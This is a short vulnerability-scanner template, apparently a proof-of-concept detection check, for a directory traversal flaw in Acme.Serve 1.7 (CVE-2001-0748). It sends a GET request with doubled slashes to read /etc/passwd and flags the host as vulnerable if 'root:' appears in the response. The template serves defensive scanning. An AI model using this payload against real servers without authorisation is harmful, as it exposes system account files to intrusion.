[info]
author = "ave"
description = "检测 Acme.Serve 1.7 漏洞，攻击者可通过向URI头部添加多个斜杠（'/'）字符，绕过路径验证机制，读取目标系统中任意文件（如/etc/passwd、/etc/shadow）。"
id = "POC-AVE-2001-0332"
name = "Acme Serve 1.7 Directory Traversal PoC"
severity = "medium"
tags = ["ave-2001-0332"]
vuln_id = [
    "CVE-2001-0748",
    "AVE-2001-0332",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
